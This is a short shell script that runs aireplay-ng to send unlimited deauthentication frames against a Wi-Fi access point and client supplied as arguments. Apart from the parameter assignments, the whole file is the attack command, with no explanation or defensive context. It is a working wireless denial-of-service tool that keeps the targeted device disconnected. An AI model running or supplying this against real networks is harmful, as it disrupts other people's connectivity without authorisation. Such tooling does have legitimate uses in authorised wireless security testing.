bssid=$1
station=$2
aireplay-ng --deauth 0 -a $bssid -c $station wlan0mon
